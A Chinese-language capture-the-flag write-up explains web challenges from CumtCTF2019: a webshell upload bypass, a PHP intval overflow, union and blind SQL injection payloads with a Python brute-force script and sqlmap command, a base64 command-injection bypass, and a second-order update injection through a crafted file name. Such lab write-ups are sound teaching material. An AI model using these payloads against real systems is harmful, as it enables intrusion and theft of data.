<h4 id="Web2：SimpleUpload签到"><a href="#Web2：SimpleUpload签到" class="headerlink" title="Web2：SimpleUpload签到"></a>Web2：SimpleUpload签到</h4><p>1、只允许png/gif/jpg文件格式，查看源码，判断为前端验证，并且提示flag在当前目录的flag.php <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201142580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、上传后缀为png的一句话木马，BurpSuite抓包改后缀为php，拿到链接。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201312733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、用菜刀链接木马，根据提示在flag.php中找到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201335585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Web3：小型线上赌场"><a href="#Web3：小型线上赌场" class="headerlink" title="Web3：小型线上赌场"></a>Web3：小型线上赌场</h4><p>1、 这一题要求下注并猜测赚的钱，但是赔率没刷新或提交一次页面都会变化。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201610824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、根据题目及后续的hint可知存在vim备份文件泄露，<code>.index.swp</code>下载swp。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202053379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、在kali下面对得到的index.swp文件进行恢复，进入文件的目录后<code>vim -r index.swp</code>，得到源码。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202211400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、进行代码审计<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$invest = $_GET[<span class="string">'invest'</span>];  </span><br><span class="line">	$rand = rand(<span class="number">2</span>,<span class="number">50</span>);  </span><br><span class="line"></span><br><span class="line">	$len = strlen(trim($_GET[<span class="string">'invest'</span>]));	</span><br><span class="line">	<span class="comment">//除去空格后所传入'invest'的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//限制非数字和0</span></span><br><span class="line">	<span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	    <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">	        <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$money = number_format($invest*$rand);</span><br><span class="line">	<span class="comment">//number_format()函数通过千位分组来格式化数字,返回的是字符串</span></span><br><span class="line"></span><br><span class="line">	$money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">	<span class="comment">//再将上一步中格式化进去的逗号去掉，并用intval()函数用于获取变量的整数值</span></span><br><span class="line">	$guess = intval($_GET[<span class="string">'guess'</span>]); </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后的判断逻辑为：猜测的数(guess)与money相等，且money的长度与invest的长度相等。<br>问题出现在<code>intval()</code>函数上，关于此函数返回值如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203014110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也就是说当传入<code>intval()</code>的参数足够大时，其返回值根据操作系统的不同，是固定的数值（32位：2147483647，64位：9223372036854775807），这一题也就是传入的invest的数足够大时，无论随机数是多少，经过<code>intval()</code>函数处理过的money的值均是不变的。</p>
<p>这样思路也就很清楚了，只需将guess的值等于money的64位上限值，也就是9223372036854775807，invest的长度要等于money的长度（任意19位数字），即可得到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203942515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Web4：SimpleSQLi"><a href="#Web4：SimpleSQLi" class="headerlink" title="Web4：SimpleSQLi"></a>Web4：SimpleSQLi</h4><p>一道没有任何过滤的SQL注入题<br>（1）手工注入过程如下:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆表名</span><br><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())  <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210130304.png" alt="在这里插入图片描述"><br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">爆字段名</span><br><span class="line">![<span class="string">?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='flagishere')  --+</span>](<span class="link">CumtCTF2019Ⅱ——Writeup（Web详解）/2019030220581225.png</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210139384.png" alt="在这里插入图片描述"><br><figure class="highlight q"><table><tr><td class="code"><pre><span class="line">爆字段</span><br><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flagishere) --+</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210147697.png" alt="在这里插入图片描述"><br>（2）sqlmap注入：<br><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://bxs.cumt.edu.cn:30007/test/index.php?id=1"</span> -<span class="keyword">D</span> security -T flagishere -<span class="keyword">C</span> flag --dump</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213143188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Web5：真的简单。。"><a href="#Web5：真的简单。。" class="headerlink" title="Web5：真的简单。。"></a>Web5：真的简单。。</h4><p>（1）也是一道SQL注入题，但是过滤了 <code>union</code> 、<code>select</code>、<code>or</code>、<code>and</code>等关键词，可以通过<strong>双写绕过</strong>。<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">爆表名(这里注意information中也包含'<span class="keyword">or</span>',所以也要双写'<span class="keyword">or</span>')</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>' uniunionon seleselectct <span class="number">1</span>,<span class="number">2</span>,(seleselectct group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema=database())  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">爆字段名</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>' uniunionon seleselectct <span class="number">1</span>,<span class="number">2</span>,(seleselectct group_concat(column_name) <span class="keyword">from</span> infoorrmation_schema.columns <span class="keyword">where</span> table_name='flag')  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>' uniunionon seleselectct <span class="number">1</span>,<span class="number">2</span>,(seleselectct flag <span class="keyword">from</span> flag) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>最终得到：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302212017142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并没有直接爆出flag，看来不是一道简单的SQL注入题。</p>
<p>（2）打开admin_08163314/exec.php页面，是后台命令执行。</p>
<p>输入如下命令进行执行，即可获得flag：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="string">"Y2F0IC9mbGFnXzMzMTQvZmxhZw=="</span>|base64<span class="variable">$IFS</span>-d`</span><br></pre></td></tr></table></figure></p>
<p>(对命令执行的绕过方法还不太熟悉，题目不能复现了，等学习后再详细解释吧…)<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213050858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Web6：SimpleSQLi2"><a href="#Web6：SimpleSQLi2" class="headerlink" title="Web6：SimpleSQLi2"></a>Web6：SimpleSQLi2</h4><p>（1）这还是一道SQL注入题，但是只会回显<code>Welcome to CUMTCTF&#39;2019~</code>和<code>NoNoNo~</code>两个页面，因此可以判断为SQL盲注。<br>（2）过滤方式和上一题差不多，但测试发现只要构造的payload里有含有空格，均返回<code>NoNoNo~</code>页面，所以判断空格被过滤了。<br>（3）关键词依旧可以通过双写绕过，空格可以通过<code>/**/</code>绕过，通过下面判断出为数字型注入，构造的代码可以直接执行。</p>
<table>
<thead>
<tr>
<th><strong>id</strong></th>
<th><strong>返回页面</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>id=1</td>
<td>Welcome to CUMTCTF’2019~</td>
</tr>
<tr>
<td>id=1’</td>
<td>NoNoNo~</td>
</tr>
<tr>
<td>id=1/**/anandd/**/1=1--+</td>
<td>Welcome to CUMTCTF’2019~</td>
</tr>
<tr>
<td>id=1/**/anandd/**/1=2--+</td>
<td>NoNoNo~</td>
</tr>
<tr>
<td>id=1’/**/anandd/**/1=1--+</td>
<td>NoNoNo~</td>
</tr>
<tr>
<td>id=1’/**/anandd/**/1=2--+</td>
<td>NoNoNo~</td>
</tr>
</tbody>
</table>
<p>知道过滤方式之后，就可以写脚本来爆破:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://bxs.cumt.edu.cn:30010/test/index.php'</span></span><br><span class="line">payloads = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,&#123;&#125;_'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:  <span class="comment"># 依次跑下面三个payload</span></span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment">#payload = f"?id=if(substr((seleselectct/**/binary/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;i&#125;,1)='&#123;j&#125;', 1, 0)"</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment">#payload = f"?id=if(substr((selselectect/**/binary/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;i&#125;,1)='&#123;j&#125;', 1, 0)"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 字段</span></span><br><span class="line">        payload = <span class="string">f"?id=if(substr((selselectect/**/binary/**/group_concat(flag)/**/from/**/flagishere) ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>', 1, 0)"</span></span><br><span class="line">        <span class="comment"># 这里通过加入binary来区分大小写，因为flag中大小写都可能包含</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'NoNoNo'</span> <span class="keyword">not</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p>
<p>最终获得flag如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303130639145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Web7：文件管理系统"><a href="#Web7：文件管理系统" class="headerlink" title="Web7：文件管理系统"></a>Web7：文件管理系统</h4><p>1、先扫目录，发现可以下载源码，进行代码审计。<br>2、查看upload.php代码，发现是如下白名单验证，无法上传绕过。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>]; </span><br><span class="line">        <span class="comment">// $path_parts["extension"] = ".jpg"</span></span><br><span class="line"></span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        <span class="comment">//$path_parts['filename'] = "',extension='',filename='webshell.jpg"</span></span><br><span class="line"></span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.问题主要出现在rename.php里，代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="comment">//因为filename是经过转义后存入数据库的，这里是正常执行sql语句</span></span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        </span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>第一个<code>select</code>语句显示根据 <code>$req[&#39;filename&#39;]</code> 从数据库里查询到已存在的一行，再用第二个<code>update</code>语句进行修改，这里的<code>&#39;oldname&#39;=&#39;{$result[&#39;filename&#39;]}&#39;</code>将从数据库里查出的<code>$result[&#39;filename&#39;]</code>再一次入库，因此存在二次注入。</p>
<p>4、观察发现<code>oldname</code>和<code>newname</code>，有几个特点：</p>
<ul>
<li>后缀相同，都是<code>$result[‘extension’]</code></li>
<li><code>oldname</code>的文件名来自数据库，<code>newname</code>的文件名来自用户输入</li>
</ul>
<p>虽然代码要求<code>oldname</code>和<code>newname</code>要求后缀相同，可以通过<strong>update型注入</strong>将<code>extension</code>改为空，同时可修改<code>filename</code>的值。<br>因此<strong>构造</strong>的<strong>文件名payload</strong>为：<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg.jpg</code> </p>
<p>5、上传文件名为：<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg.jpg</code>的文件后，根据upload.php知:<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="variable">$path_parts</span>[<span class="string">"extension"</span>] = <span class="string">".jpg"</span></span><br><span class="line"><span class="variable">$path_parts</span>[<span class="string">'filename'</span>] = <span class="string">"',extension='',filename='webshell.jpg"</span></span><br><span class="line">插入数据库后，此时数据库里：</span><br><span class="line">filename字段的值为经过addslashes()转义的<span class="string">',extension='</span><span class="string">',filename='</span>webshell.jpg</span><br><span class="line">extension字段的值为.jpg</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303110502291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>6、下来才是真正的<strong>updata注入过程</strong></p>
<p>进入到rename.php页面，进行如下操作，将文件名修改为由<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg</code>修改为<code>webshell.jpg</code>（这里rename页面输入的文件名均是要求不含后缀的，在数据库里文件名和后缀是分两个字段进行存储的）<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303110649872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上述操作改名后：<br><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$req[<span class="string">'oldname'</span>] = <span class="string">"',extension='',filename='webshell.jpg"</span></span><br><span class="line">$req[<span class="string">'newname'</span>] = <span class="string">"webshell.jpg"</span></span><br></pre></td></tr></table></figure></p>
<p>接下来执行：<code>select * from &#39;file&#39; where &#39;filename&#39;=&#39;{$req[&#39;oldname&#39;]}&#39;</code><br>因为<code>filename</code>在上传后经过<code>addslashes()</code>转义的，所以此条语句正常执行</p>
<p>但是在执行下条语句，也就是：</p>
<pre><code>update &apos;file&apos; set &apos;filename&apos;=&apos;{$req[&apos;newname&apos;]}&apos;, &apos;oldname&apos;=&apos;{$result[&apos;filename&apos;]}&apos; where &apos;fid&apos;={$result[&apos;fid&apos;]}
</code></pre><p>出现了注入，将构造的文件名插入这条语句得到实际执行的sql语句:</p>
<pre><code>update &apos;file&apos; set &apos;filename&apos;=&apos;webshell.jpg&apos;, &apos;oldname&apos;=&apos;&apos;,extension=&apos;&apos;,filename=&apos;webshell.jpg&apos; where &apos;fid&apos;={$result[&apos;fid&apos;]}
</code></pre><p>可以发现通过updata语句，修改了数据中的字段值，此时<strong>数据库</strong>中各字段：</p>
<pre><code>filename = webshell.jpg
oldname = 空
extension =  空
</code></pre><p>这样思路就很清楚了：</p>
<ul>
<li>虽然<strong>数据库</strong>中的<code>filename</code>通过注入改变了，但<strong>真实系统目录</strong>里的文件名为其实并没有变。<br>但是通过前面的注入，这条记录的<code>extension</code>值为空，因此只要能够调用<code>rename()</code>函数，就直接把输入的<code>filename</code>里的后缀当成文件后缀。</li>
<li>执行<code>rename()</code>函数还有一个判断:<code>if(file_exists($oldname))</code>，但实际上我们系统目录并没有<code>webshell.jpg</code>这个文件，这样就需要再上传一个<code>webshell.jpg</code>文件。</li>
</ul>
<p>7、因此接下来就可以上传真正包含一句话木马的文件：<code>webshell.jpg</code>，上传后：<br> <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"> <span class="variable">$path_parts</span>[<span class="string">"extension"</span>] = <span class="string">".jpg"</span></span><br><span class="line"> <span class="variable">$path_parts</span>[<span class="string">'filename'</span>] = <span class="string">"webshell"</span></span><br><span class="line">并在数据库中插入了新的一条记录：</span><br><span class="line"> filename字段的值为经过addslashes()转义的webshell</span><br><span class="line"> extension字段的值为.jpg</span><br><span class="line"> 且系统目录下存在真实文件：webshell.jpg</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303112153331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来再次进入rename.php页面进行改名，这也是很关键的一步：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/2019030311225052.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将<code>webshell.jpg</code>改为<code>webshell.php</code>，这样操作后：</p>
<p>因为注入后，数据库中存在<code>filename</code>为<code>webshell.jpg</code>的记录，因此可以绕过这条语句：</p>
<pre><code>select * from &apos;file&apos; where &apos;filename&apos;=&apos;{$req[&apos;oldname&apos;]}&apos;
</code></pre><p>然后再次通过updata语句：</p>
<pre><code>update &apos;file&apos; set &apos;filename&apos;=&apos;{$req[&apos;newname&apos;]}&apos;, &apos;oldname&apos;=&apos;{$result[&apos;filename&apos;]}&apos; where &apos;fid&apos;={$result[&apos;fid&apos;]}
</code></pre><p>将<code>filename</code>的值从<code>webshell.jpg</code>修改为<code>webshell.php</code>，<code>oldname</code>修改为原来<code>filename</code>的值，其他不变，此时数据库中这条记录的字段值为：</p>
<pre><code>filename = webshell.php
oldname = webshell.jpg
extension =  空
</code></pre><p>接下来，因为后缀extension为空，所以通过这两条语句赋值后：<br><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>]<span class="comment">;</span></span><br><span class="line">$newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>]<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p> 实际上得到：</p>
<pre><code>$oldname = webshell.php
$newname = webshell.jpg
</code></pre><p>最后，在进行<code>if(file_exists($oldname))</code>判断时，因为第二次上传到目录的文件就是<code>webshell.jpg</code>，所以可以通过判断。<br>这样就可以执行<code>rename($oldname, $newname)</code>，将目录下的包含木马的文件<code>webshell.jpg</code>改名为<code>webshell.php</code>，也就成功上传了php木马到后台。</p>
<p>8、既然已经成功上传了webshell，那么直接用菜刀链接，即可getshell，获得flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/2019030311515537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019&amp;GWCTF2019——Writeup</title>
    <url>/2020/03/03/GXYCTF2019-GWCTF2019%E2%80%94%E2%80%94Writeup/</url>
